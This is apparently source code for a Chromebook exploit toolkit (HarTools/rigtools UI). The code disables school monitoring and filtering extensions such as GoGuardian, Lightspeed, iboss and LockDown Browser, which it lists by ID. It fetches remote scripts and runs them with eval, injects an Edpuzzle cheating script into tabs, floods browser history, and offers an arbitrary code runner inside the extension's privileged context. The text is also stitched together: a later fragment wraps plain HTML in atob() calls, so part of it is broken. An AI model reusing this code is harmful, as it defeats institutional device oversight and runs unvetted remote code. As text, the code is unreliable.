                        localStorage.setItem("userdefIds", JSON.stringify(userdefIds));
                        makeToast("added " + extension.shortName + " to the list", 2);
                    }

                    if (localStorage.getItem("userdefIds") === JSON.stringify([])) {
                        document
                            .querySelector("#disable-userdef-exts")
                            .setAttribute("style", "display: none;");
                    } else {
                        document
                            .querySelector("#disable-userdef-exts")
                            .setAttribute("style", "display: inline;");
                    }
                });

                extlist_element.appendChild(card);
            });
            savedExtList = ordlist;
            resolve();
        });
    });
}

const fileManagerPrivateTemplate = `
  <div id="fileManagerPrivate_cap">
    <div id="FMP_openURL">
      <button id="btn_FMP_openURL">Open URL in Skiovox window</button>
    </div>
  </div>

`;
const htmlStyle = `
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap');

* {
  font-family: 'Roboto', Arial, sans-serif;
}

body {
  background-color: #1e1f22;
  color: #fff;
  margin: 0;
  padding: 20px;
}

body::-webkit-scrollbar,
dialog::-webkit-scrollbar,
dialog div::-webkit-scrollbar {
  display: none;
}

p {
  margin: 5px auto;
  color: white;
}

#chrome_management_disable_ext, #ext_default {
  max-width: 1200px;
  margin: 0 auto;
}

h1 {
  font-size: 24px;
  margin-bottom: 20px;
}

.description {
  margin-bottom: 20px;
}

ul {
  list-style-type: none;
  padding: 0;
  margin: 0;
  padding-bottom: 50px;
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: center;
}

.extension-card, .extension-card-all {
  margin-left: 5px;
  margin-bottom: 6px;
  background: #292a2d;
  border-radius: 10px;
  width: 375px;
  height: 140px;
  padding: 10px;
  display: flex;
  flex-direction: column;
  gap: 10px;
  padding: 10px;
  position: relative;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
}

.extension-header {
  display: flex;
  align-items: center;
  margin-bottom: 25px;
  margin-top: 10px;
}

.extension-icon {
  width: 32px;
  height: 32px;
  flex-shrink: 0;
  user-select: none;
  margin-left: 10px;
  margin-right: 10px;
}

.extension-name {
  font-size: 13px;
  color: white;
}

.extension-id {
  font-size: 13px;
  color: #c4c7c5;
  margin-left: 10px;
}

.switch {
    position: absolute;
    display: inline-block;
    width: 28px;
    height: 16px;
    right: 20px;
    bottom: 15px;
}

.switch input {
  opacity: 0;
  width: 0;
  height: 0;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #444746;
  border-radius: 15px;
  border: 1.5px solid #8e918f;
  transition: background-color 0.1s ease-in-out, border-color 0.1s ease-in-out;
}

.slider:before {
  content: "";
  position: absolute;
  height: 12px;
  width: 12px;
  left: 2px;
  top: 50%;
  transform: translateY(-50%) scale(0.8);
  background-color: #8e918f;
  border-radius: 50%;
  transition: transform 0.1s ease-in-out, background-color 0.1s ease-in-out;
}

.switch:hover .slider:before {
  box-shadow: 0 0 6px rgba(255, 255, 255, 0.5);
}

input:checked + .slider {
  background-color: #a8c7fa;
  border-color: #a8c7fa;
}

input:checked + .slider:before {
  transform: translate(10px, -50%) scale(1);
  background-color: #062e6f;
}

.header {
  display: flex;
  align-items: center;
  justify-content: center;
}

.logo {
  width: 4em;
  height: auto;
  margin-right: 10px;
}

.tablist-item {
  border: 1px solid #333;
  margin-bottom: 10px;
  background-color: #000;
  padding: 15px;
  border-radius: 8px;
  display: flex;
  font-weight: bold;
  align-items: center;
}

.tablist-item img {
  max-width: 25px;
  margin-right: 10px;
}

.tablist-item span {
  padding: 10px 0;
  text-overflow: ellipsis;
  width: 100%;
  white-space: nowrap;
  overflow: hidden;
  word-break: break-all;
}

.tablist-item span:hover {
  overflow: visible;
  white-space: normal;
  height: auto;
}

button {
    background: transparent;
    color: #9dbae9;
    font-weight: bold;
    border: 1px solid #047db7;
    border-radius: 20px;
    height: 35px;
    padding: 7px 10px;
    cursor: pointer;
    align-self: flex-end;
    transition: background 0.2s ease-in-out;
    outline: none;
}

button:hover {
    background: #38393b;
}

input {
  padding: 8px 16px;
  margin: 4px 2px;
  color: white;
  background-color: #0a0a0a;
  border: 1px solid #333;
}

input:hover {
  background-color: #111;
  border-color: #fff;
}

#toggleable-buttons button {
  position: relative;
  display: inline-flex;
  align-items: center;
  justify-content: flex-start;
  padding: 9px 15px 9px 60px;
  background-color: white;
  color: black;
  border-radius: 6px;
  margin: 4px 2px;
  transition: background-color 0.3s, color 0.3s;
}

#toggleable-buttons button:hover {
  background-color: #e2e2e2;
}

#toggleable-buttons button::before {
  content: '';
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  width: 42px;
  height: 22px;
  background-color: #333;
  border-radius: 12px;
}

#toggleable-buttons button::after {
  content: '';
  position: absolute;
  left: 14px;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  background-color: #fff;
  border-radius: 50%;
}

#toggleable-buttons button[toggled="true"]::before {
  background-color: #000;
}

#toggleable-buttons button[toggled="true"]::after {
  transform: translateY(-50%) translateX(20px);
}

.container {
  display: flex;
  gap: 10px;
}

#code-run {
  background-color: #fff;
  color: black;
  border: none;
  border-radius: 5px;
  padding: 8px 16px;
  font-weight: bold;
  cursor: pointer;
}

#code-run:hover {
  background-color: #e2e2e2;
}

#code {
  background: #000;
  color: white;
  width: 100%;
  min-height: 50px;
  height: 200px;
  resize: both;
  border: 1px solid #4B4B4D;
  border-radius: 5px;
  font-family: monospace, sans-serif;
  padding: 8px;
  box-sizing: border-box;
}

#code:focus {
  border-color: #fff;
}

.toast[popover]:popover-open {
  opacity: 1;
  top: 5px;
  left: 50%;
}

@starting-style {
  .toast[popover]:popover-open {
    opacity: 0;
    transform: translateY(-100%);
  }
}

.toast[popover] {
  position: fixed;
  inset: unset;
  padding: 5px 10px;
  border-radius: 5px;
  opacity: 0;
  font-weight: bold;
  background: #0a0a0a;
  color: white;
  border: 1px solid #444;
}

dialog {
  opacity: 0;
  padding: 30px;
  border: 1px solid #2d2d2d;
  background: #000;
  background-image: radial-gradient(#333 1px, transparent 1px);
  background-size: 2rem 2rem;
  border-radius: 10px;
  transition: all 0.5s;
  min-width: 50vw;
  min-height: 60vh;
  max-width: 50vw;
  max-height: 60vh;
  display: flex;
  flex-direction: column;
}

dialog[open] {
  opacity: 1;
  transform: scale(1);
}

dialog::backdrop {
  background: rgba(0, 0, 0, 0.25);
  backdrop-filter: blur(3px);
}

dialog div {
  background-color: #000;
  font-family: 'Geist', sans-serif;
}

dialog p {
  margin-bottom: 9px;
  padding: 9px;
  border: 1px solid #27272a;
  font-weight: 700;
}

dialog h1 {
  font-size: 1.5rem;
  color: white;
  font-weight: 900;
}

whitebuttons button {
  background-color: transparent;
  border: 1px solid rgb(4, 125, 183);
  color: rgb(168, 199, 250);
}

whitebuttons button:hover {
  background-color: rgba(168, 199, 250, 0.1);
}

litstuff {
  color: #444;
  font-family: monospace, sans-serif;
  font-size: 12px;
  font-style: italic;
  margin-left: 6px;
}
    </style>
  `;

onload = async function x() {
    let foundNothing = true;
    document.open();
    this.document.write(htmlStyle);
    document.close();

    if (chrome.fileManagerPrivate) {
        chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
        document.write(fileManagerPrivateTemplate);
        document.body.querySelector("#btn_FMP_openURL").onclick = function(ev) {};
    }

    if (chrome.management.setEnabled) {
        document.body.insertAdjacentHTML("beforeend", managementTemplate);
        const extlist_element = document.querySelector(".extlist");

        await updateExtensionStatus(extlist_element);
        const container_extensions = document.body.querySelector(
            "#chrome_management_disable_ext"
        );

        container_extensions.querySelector("#current-extension").onclick =
            async function df(e) {
                try {
                    const grabidtokill = chrome.runtime.id;
                    chrome.management.setEnabled(grabidtokill, false);
                } catch {
                    alert("unsuccessful");
                }
            };

        container_extensions.querySelector("#rmv-cmn-blt").onclick = function df() {
            const bloatIds = [
                "cgbbbjmgdpnifijconhamggjehlamcif",
                "lfkbbmclnpaihpaajhohhfdjelchkikf",
                "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
                "pohmgobdeajemcifpoldnnhffjnnkhgf",
                "becdplfalooflanipjoblcmpaekkbbhe",
                "feepmdlmhplaojabeoecaobfmibooaid",
                "adkcpkpghahmbopkjchobieckeoaoeem",
                "haldlgldplgnggkjaafhelgiaglafanh",
                "filgpjkdmjinmjbepbpmnfobmjmgimon",
                "kkbmdgjggcdajckdlbngdjonpchpaiea",
                "njdniclgegijdcdliklgieicanpmcngj",
                "hpkdokakjglppeekfeekmebfahadnflp",
            ];

            let exts = {};
            let extlngth = 0;

            function getLength() {
                return new Promise((resolve) => {
                    bloatIds.forEach((id, i) => {
                        extensionExists(id).then((res) => {
                            if (res) extlngth++;
                            if (bloatIds.length - 1 === i) resolve();
                        });
                    });
                });
            }

            function initExtObj() {
                return new Promise((resolve) => {
                    bloatIds.forEach((id) =>
                        chrome.management.get(id, (e) => {
                            Object.assign(exts, JSON.parse(`{"${e.id}":"${e.shortName}"}`));
                            if (Object.keys(exts).length == extlngth) resolve();
                        })
                    );
                });
            }

            getLength().then(() =>
                initExtObj().then(() =>
                    makeDialog(
                        "Are you sure you want to disable the following extensions?",
                        Object.values(exts),
                        function() {},
                        function() {
                            let disabledExts = [];
                            Object.keys(exts).forEach((id) => {
                                chrome.management.get(id, (e) => {
                                    if (e.enabled) {
                                        if (id == chrome.runtime.id) return;

                                        disabledExts.push(e.shortName);
                                        chrome.management.setEnabled(id, false);
                                    }
                                });
                            });

                            setTimeout(() => {
                                if (!disabledExts.length < 1) {
                                    makeToast(
                                        "disabled the following extensions:\r\n" +
                                        disabledExts.join("\r\n"),
                                        disabledExts.length
                                    );
                                    updateExtensionStatus(extlist_element);
                                }
                            }, 250);
                        }
                    )
                )
            );
        };

        if (localStorage.getItem("userdefIds") == JSON.stringify([])) {
            container_extensions
                .querySelector("#disable-userdef-exts")
                .setAttribute("style", "display: none;");
        }

        container_extensions.querySelector("#disable-userdef-exts").onclick =
            function df(e) {
                let exts = {};

                function initExtObj() {
                    let idlist = JSON.parse(localStorage.getItem("userdefIds"));
                    return new Promise((resolve) => {
                        idlist.forEach((id) => {
                            chrome.management.get(id, (e) => {
                                Object.assign(exts, JSON.parse(`{"${e.id}":"${e.shortName}"}`));
                                if (Object.keys(exts).length == idlist.length) resolve();
                            });
                        });
                    });
                }

                initExtObj().then(() => {
                    makeDialog(
                        "Are you sure you want to disable the following extensions?",
                        Object.values(exts),
                        function() {},
                        function() {
                            let disabledExts = [];
                            JSON.parse(localStorage.getItem("userdefIds")).forEach((id) => {
                                chrome.management.get(id, (e) => {
                                    if (e.enabled) {
                                        if (id == chrome.runtime.id) return;

                                        disabledExts.push(e.shortName);
                                        chrome.management.setEnabled(id, false);
                                    }
                                });
                            });

                            setTimeout(() => {
                                if (!disabledExts.length < 1) {
                                    makeToast(
                                        "disabled the following extensions:\r\n" +
                                        disabledExts.join("\r\n"),
                                        disabledExts.length
                                    );
                                    updateExtensionStatus(extlist_element);
                                }
                            }, 250);
                        }
                    );
                });
            };
    }
    const otherFeatures = window.chrome.runtime.getManifest();
    const permissions = otherFeatures.permissions;

    new DefaultExtensionCapabilities().activate();
    document.body.insertAdjacentHTML(
        "beforeend",
        `
      <title>Untitled document</title>
      <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/">
      `
    );

    const ScriptButtons = document.querySelector("#other-buttons");

    ScriptButtons.querySelector("#swamp").onclick = async function df(e) {
        fetch(
                "https://raw.githubusercontent.com/T3M1N4L/rigtools-updated-ui/refs/heads/main/scripts/swamp-ultra.js"
            )
            .then((res) => res.text())
            .then(eval);
    };

    ScriptButtons.querySelector("#update").onclick = async function df(e) {
        (async () => {
            const fs = await new Promise(function(resolve) {
                webkitRequestFileSystem(PERSISTENT, 2 * 1024 * 1024, resolve);
            });

            function writeFile(file, data) {
                return new Promise((resolve, reject) => {
                    fs.root.getFile(file, {
                        create: true
                    }, function(entry) {
                        entry.remove(function() {
                            fs.root.getFile(file, {
                                create: true
                            }, function(entry) {
                                entry.createWriter(function(writer) {
                                    writer.write(new Blob([data]));
                                    writer.onwriteend = resolve.bind(null, entry.toURL());
                                });
                            });
                        });
                    });
                });
            }

            const url = await writeFile(
                "hartools.html",
                `${await fetch(
          "https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/payloads/index.html"
        ).then((res) => res.text())}<script src="./hartools.js"></script>`
            );

            await writeFile(
                "hartools.js",
                await fetch(
                    "https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/payloads/index.js"
                ).then((res) => res.text())
            );

            chrome.tabs.create({
                url
            });
        })();
    };
    ScriptButtons.querySelector("#quick-rmv-blt").onclick = async function df(e) {
        (async () => {

            const fs = await new Promise(function (resolve) {
                  webkitRequestFileSystem(PERSISTENT, 2 * 1024 * 1024, resolve);
                });
            
            function writeFile(file, data) {
                  return new Promise((resolve, reject) => {
                    fs.root.getFile(file, { create: true }, function (entry) {
                      entry.remove(function () {
                        fs.root.getFile(file, { create: true }, function (entry) {
                          entry.createWriter(function (writer) {
                            writer.write(new Blob([data]));
            
                            writer.onwriteend = resolve.bind(null, entry.toURL());
                          });
                        });
                      });
                    });
                  });
                }
            
            const JS = `try {
                    const bloatIds = [
                      "cgbbbjmgdpnifijconhamggjehlamcif",
                      "lfkbbmclnpaihpaajhohhfdjelchkikf",
                      "ncbofnhmmfffmcdmbjfaigepkgmjnlne",
                      "pohmgobdeajemcifpoldnnhffjnnkhgf",
                      "becdplfalooflanipjoblcmpaekkbbhe",
                      "feepmdlmhplaojabeoecaobfmibooaid",
                      "adkcpkpghahmbopkjchobieckeoaoeem",
                      "haldlgldplgnggkjaafhelgiaglafanh",
                      "filgpjkdmjinmjbepbpmnfobmjmgimon",
                      "kkbmdgjggcdajckdlbngdjonpchpaiea",
                      "njdniclgegijdcdliklgieicanpmcngj",
                      "hpkdokakjglppeekfeekmebfahadnflp"
                    ];
            
                    bloatIds.forEach((id) => {
                      if (id == chrome.runtime.id) return;
                        chrome.management.setEnabled(id, false);
                    });
                    window.close();
                  } catch {
                    alert("unsuccessful");
                  }
            `;
            
            const fileName = "bloat";
            
            const url = await writeFile(`${fileName}.html`,`<!doctypehtml><title>disabling..</title><link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"rel=stylesheet><style>p{margin:0}body{background-color:#000;color:#fff;font-family:Inter,sans-serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}h1::before{content:"# ";color:oklch(81.21% .1409 165.14);font-weight:900}.inner{display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center}textarea{width:max-content;padding-top:1em;overflow-y:hidden;border-radius:10px;background:oklch(17.03% .0083 285.49 / .5);border:1px solid oklch(68.65% .0374 274.73 / .5);color:oklch(95.92% .019253 273.2377);resize:none;font-family:monospace;transition:all .5s cubic-bezier(.175,.885,.32,1.9),color .25s,border-color .25s}</style><div class=inner><textarea cols=12 readonly rows=2>  (^____^)</textarea><h1>disabling...</h1><p>happy days  without blocking am i right?</div><script src=./${fileName}.js></script>`);
            
            await writeFile(`${fileName}.js`, JS);
            
            chrome.tabs.create({ url });
            
            })();
    };

    ScriptButtons.querySelector("#hstfld").onclick = async function df(e) {
        document.title = "Untitled document";
        let link =
            document.querySelector("link[rel~='icon']") ||
            document.createElement("link");
        link.rel = "icon";
        document.head.appendChild(link);
        link.href =
            "https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/";

        let num = prompt(
            "How Times Do You Want This Page To Show Up In your History?"
        );
        let done = false;
        const x = window.location.href;
        for (let i = 1; i <= num; i++) {
            history.pushState(0, 0, i === num ? x : i.toString());
            if (i === num) done = true;
        }
        if (done) {
            alert(
                "Flooding Successful!\n " +
                window.location.href +
                " \nIs Now In Your History " +
                num +
                (num == 1 ? " time." : " Times.")
            );
        }
    };

    const TabButtons = document.querySelector("#tabs-buttons");

    if (chrome.tabs.executeScript) {

        function listenerApp(callback) {
            const func = (id, changeInfo) => {
                if (changeInfo.status === "complete") {
                    chrome.tabs.get(id, (tab) => {
                        if (tab) {
                            callback(tab);
                        }
                    });
                }
            };
            chrome.tabs.onUpdated.addListener(func);
            return func;
        }

        const scripts = {};
        const conditions = {};
        const listeners = {};

        scripts.eruda = `
    fetch("https://cdn.jsdelivr.net/npm/eruda").then(res => res.text()).then((data) => {
      eval(data);
      if (!window.erudaLoaded) {
        eruda.init({
          defaults: {
            displaySize: 45,
            theme: "AMOLED"
          }
        });
        window.erudaLoaded = true;
      }
    });
  `;

        scripts.chii = `
    const script = document.createElement('script');
    script.src = 'https://chii.liriliri.io/playground/target.js';
    script.setAttribute('embedded', 'true');
    document.head.appendChild(script);
  `;

        scripts.adblock = `
    (function(){

      var selectors = [

      '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',
      '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',
      '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',
      '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',
      'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',

      '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',
      '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',
      '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',
      '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',
      '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',
      'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',
      'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',
      'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',
      'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',
      'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',
      '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',
      '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',
      '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',

      'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside',
      'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',
      'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',
      'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ];
      for(let i in selectors) {
          let nodesList = document.querySelectorAll(selectors[i]);
          for(let i = 0; i < nodesList.length; i++) {
              let el = nodesList[i];
              if(el && el.parentNode)
              el.parentNode.removeChild(el);
          }
      }
    })();
  `;
  /*scripts.glocked = `
fetch("https://raw.githubusercontent.com/xNasuni/google-forms-unlocker/refs/heads/main/script.js")
  .then(response => {
    if (!response.ok) {
      throw new Error("Network response was not ok");
    }
    return response.text();
  })
  .then(scriptContent => {
    if (!window.skibLoaded) {
      eval(scriptContent);
      window.skibLoaded = true;
    }
  })
  .catch(error => alert("Error loading script:", error));
`;
*/
        scripts.edpuzzle = `
    fetch("https://cdn.jsdelivr.net/gh/Miner49ur/shorthand@main/edpuzzlingscript.js").then(r => r.text()).then(r => {
      if (!window.edpuzzlesLoaded) {
        eval(r);
        window.edpuzzlesLoaded = true;
      }
    });
  `;
        conditions.edpuzzle = (tab) => tab.url.match(/edpuzzle\.com\/assignments/g);
        // conditions.glocked = (tab) => tab.url.match(/https?:\/\/docs\.google\.com\/forms\//g);
        const ToggleButtons = TabButtons.querySelector("#toggleable-buttons");

        ToggleButtons.querySelectorAll("button").forEach(
            (b) =>
            (b.onclick = () => {
                const id = b.id;

                if (b.hasAttribute("toggled")) {

                    if (id in listeners)
                        chrome.tabs.onUpdated.removeListener(listeners[id]);
                    b.removeAttribute("toggled");
                } else {

                    const script = scripts[id] || "";
                    const condition = conditions[id] || ((tab) => true);
                    const func = listenerApp((tab) => {
                        if (condition(tab)) {
                            chrome.tabs.executeScript(tab.id, {
                                code: script
                            });
                        }
                    });

                    listeners[id] = func;

                    b.setAttribute("toggled", "true");
                }
            })
        );
    } else {
        TabButtons.style.display = "none";
    }

    document
        .querySelector("#code-run")
        .addEventListener("click", () => runCode(false));
};

const runCode = async (onTab, tabId = "") => {
    const codeTextarea = document.querySelector("#code");
    let code = codeTextarea.value.trim();

    const outputDiv = document.querySelector("#code-output");

    if (code.toLowerCase() === "prahit") {

        const container = document.createElement("div");
        container.className = "prahit-container";

        const overlayImage = document.createElement("img");
        overlayImage.src =
            "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/prahit.png";
        overlayImage.alt = "Prahit Image";
        overlayImage.className = "prahit-image";

        const textBox = document.createElement("div");
        textBox.textContent = "\"I made my own oil rigging stock market tools.\"";
        textBox.className = "prahit-textbox";

        container.appendChild(overlayImage);
        container.appendChild(textBox);

        document.body.appendChild(container);

        const snowflakesDiv = document.createElement("div");
        snowflakesDiv.className = "snowflakes";
        snowflakesDiv.setAttribute("aria-hidden", "true");

        for (let i = 0; i < 14; i++) {
            const snowflake = document.createElement("div");
            snowflake.className = "snowflake";

            const snowflakeImage = document.createElement("img");
            snowflakeImage.width = 30;
            snowflakeImage.src = "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/prahit.png";
            snowflake.appendChild(snowflakeImage);

            snowflakesDiv.appendChild(snowflake);
        }

        document.body.appendChild(snowflakesDiv);

        const explosionImage = document.createElement("img");
        explosionImage.src = "https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/boom.awebp";
        explosionImage.style.position = "fixed";
        explosionImage.style.top = "0";
        explosionImage.style.left = "0";
        explosionImage.style.width = "100%";
        explosionImage.style.height = "100%";
        explosionImage.style.zIndex = "9999";
        explosionImage.style.display = "none";
        document.body.appendChild(explosionImage);

        const explode = new Audio("https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/boom.mp3");

        const catsMusic = new Audio("https://raw.githubusercontent.com/t3m1n4l/rigtools-updated-ui/refs/heads/main/img/cats.mp3");
        catsMusic.loop = true;

        function showExplosionAndPlayMusic() {

            explosionImage.style.display = 'block';

            explode.play();
            catsMusic.play();

            setTimeout(function() {
                explosionImage.style.display = 'none';
            }, 1500);

            setTimeout(function() {
                explode.pause();
                explode.currentTime = 0;
            }, 1500);
        }

        showExplosionAndPlayMusic();

        return;
    }

    if (onTab) {
        code = chrome.tabs.executeScript ?
            `;chrome.tabs.executeScript(
          ${tabId},
          { code: ${JSON.stringify(code)} }
        )` :
            chrome.scripting ?
            `chrome.scripting.executeScript({
          target: {tabId: ${tabId}},
          func: () => {${code}}
        });` :
            `alert("something went wrong, runCode was executed on a tab without proper permissions")`;
    }

    try {
        const originalLog = console.log;
        console.log = (...args) => {
            outputDiv.innerHTML += args.join(" ") + "<br>";
        };

        const fs = await DefaultExtensionCapabilities.getFS();

        function writeFile(file, data) {
            return new Promise((resolve, reject) => {
                fs.root.getFile(file, {
                    create: true
                }, function(entry) {
                    entry.remove(function() {
                        fs.root.getFile(file, {
                            create: true
                        }, function(entry) {
                            entry.createWriter(function(writer) {
                                writer.write(new Blob([data]));
                                writer.onwriteend = resolve.bind(null, entry.toURL());
                            });
                        });
                    });
                });
            });
        }

        const url = await writeFile("src.js", code);
        let script =
            document.body.querySelector("#evaluate_elem") ??
            document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);

        console.log = originalLog;
    } catch (error) {
        outputDiv.innerHTML = `Error: ${error}`;
    }
};==`))
                    const url = await writeFile('index.html', `${atob('<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Extension Evaluation - HarTools</title>
</head>

<body>
  <div id="particles-js"></div>
  <div class="main">
    <h1>No payloads are available</h1>
    <p>No payloads currently available for your extension. Try another extension.
      We are currently developing payloads for other APIs.</p>
    <p>Available payloads for permissions:</p>
    <ul>
      <li>management</li>
    </ul>
  </div>
  
  <style>
    body {
      background-color: #1e2030;
      color: white;
      font-family: Arial, Helvetica, sans-serif;
      overflow: hidden;
    }

    a {
      color: #b7bdf8;
    }

    .main {
      top: 50%;
      left: 50%;
      position: absolute;
      transform: translate(-50%, -50%);
      border: 3px solid white;
      font-weight: bold;
      padding: 5%;
      border-radius: 10px;
      text-align: center;
      background-color: #24273a;
    }

    .button {
      background-color: #a6da95;
      border: none;
      color: white;
      padding: 10px 20px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 14px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 5px;
    }

    ul {
      text-align: center;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
  </style>
</body>

</html>=')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);
            
            }
            document.open();
            //in order to update entry.html, replace the below string after atob(` with the base64 code of entry.html
            document.write(atob(`<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dashboard</title>
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Geist:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap');

      body {
        font-family: 'Geist', sans-serif;
        background-color: #202124;
        color: #e8eaed;
        margin: 0;
        padding: 20px;
      }

      .main {
        max-width: 900px;
        margin: 50px auto;
        background-color: #2b2b2b;
        border-radius: 12px;
        padding: 30px;
        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
        border: 1px solid #3c4043;
        transition: box-shadow 0.3s ease, border-color 0.3s ease;
      }

      .main:hover {
  box-shadow: 0 0 10px 2px #8a2be2, 0 0 20px 4px #8a2be2;
  border-color: #8a2be2;
      }

      .header {
        display: flex;
        flex-direction: column;
        align-items: center;
        margin-bottom: 20px;
      }

      .logo {
        width: 3.5em;
        height: auto;
        margin-bottom: 10px;
      }

      h1 {
        font-size: 2.2em;
        margin: 0;
        color: #bb86fc;
      }

      p {
        font-size: 14px;
        line-height: 1.6;
        color: #dadce0;
      }

      a {
        color: #bb86fc;
        text-decoration: underline;
      }

      a:hover {
        text-decoration: none;
      }

      .button {
        background-color: #8a2be2;
        color: white;
        padding: 8px 14px;
        font-size: 14px;
        margin: 6px 4px;
        border: none;
        cursor: pointer;
        border-radius: 6px;
        font-weight: bold;
        transition: all 0.2s ease;
        display: inline-block;
      }

      .button:hover {
        background-color: #a066f5;
        transform: scale(1.05);
      }

      .button:focus {
        outline: none;
      }

      input,
      select,
      textarea {
        background-color: #303134;
        color: #e8eaed;
        border: 1px solid #5f6368;
        padding: 10px;
        border-radius: 4px;
        width: 100%;
        margin-bottom: 15px;
      }

      input:focus,
      select:focus,
      textarea:focus {
        border-color: #bb86fc;
        outline: none;
      }

      ::placeholder {
        color: #9aa0a6;
      }

      hr {
        border: none;
        border-top: 1px solid #3c4043;
        margin: 20px 0;
      }

      .background-grid {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-image: radial-gradient(#303134 1px, transparent 1px);
        background-size: 2rem 2rem;
        z-index: -1;
        animation: moveGrid 4s linear infinite;
      }

      @keyframes moveGrid {
        0% {
          background-position: 0 0;
        }
        100% {
          background-position: 2rem 2rem;
        }
      }

      .background-grid:hover {
        background-position-x: 2rem;
      }
        iframe {
            width: 0;
            height: 0;
            border: 0;
            visibility: hidden;
            position: absolute;
            left: -9999px;
        }
    </style>
  </head>
  <body>
    <div class="background-grid"></div>
    <div class="main">
      <div class="header">
        <img src="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
        <h1>HarTools</h1>
        <p>Developer Tools and Extension Code execution</p>
      </div>

      <p>This was found by <a href="https://crossjbly.pages.dev/">crossjbly</a><br>
      Original RigTools Exploit was found by <a href="https://github.com/FWSmasher">FWSmasher</a></p>
      <hr>
      <p>AKA: if someone tells you that they made this, they're lying and you should laugh at them</p>
      <hr>
      <p>Additional credits: Discord: @axqmx (testing and helping with development) @pwen (ideas) | Github:
        <a href="https://github.com/FWSmasher">FWSmasher</a>,
        <a href="https://github.com/Blobby-Boi">Blobby Boi</a>
      </p>
      <hr>

      <p>Press Q for evaluating code under <a class="button" id="extdbg" href="javascript:void(0)">extension id</a></p>
      <p>Or press 1-9 for some hardcoded extensions</p>
      <p>
        <a class="button hardcoded" ext="adkcpkpghahmbopkjchobieckeoaoeem" href="javascript:void(0)">ls filter</a>
        <a class="button hardcoded" ext="hpkdokakjglppeekfeekmebfahadnflp" href="javascript:void(0)">ls alert</a>
        <a class="button hardcoded" ext="haldlgldplgnggkjaafhelgiaglafanh" href="javascript:void(0)">goguardian</a>
        <a class="button hardcoded" ext="moehkbbcbklmkcjibcbbooebgpogejoc" href="javascript:void(0)">aristotle</a>
        <a class="button hardcoded" ext="kmffehbidlalibfeklaefnckpidbodff" href="javascript:void(0)">iboss</a>
        <a class="button hardcoded" ext="mloajfnmjckfjbeeofcdaecbelnblden" href="javascript:void(0)">snap&read</a>
        <a class="button hardcoded" ext="fogjeanjfbiombghnmkmmophfeccjdki" href="javascript:void(0)">lockdown browser</a>
        <a class="button hardcoded" ext="kmpjlilnemjciohjckjadmgmicoldglf" href="javascript:void(0)">dyknow cloud</a>
